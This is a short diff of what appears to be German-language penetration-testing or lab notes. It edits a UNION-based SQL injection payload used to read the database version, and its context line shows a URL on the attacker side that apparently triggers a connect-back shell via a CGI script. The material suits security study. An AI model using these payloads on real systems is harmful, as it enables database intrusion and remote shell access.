@@ -137,7 +137,7 @@ Beim Angreifer: `http://192.168.178.93/bash/connectme.cgi?ip=192.168.178.21&port
 
 ### Version herausbekommen
 ```SQL
-" UNION SELECT version(), null -- 
+" UNION SELECT version(), null-- 
 ```
 
 ### Datenbankschema (= web)
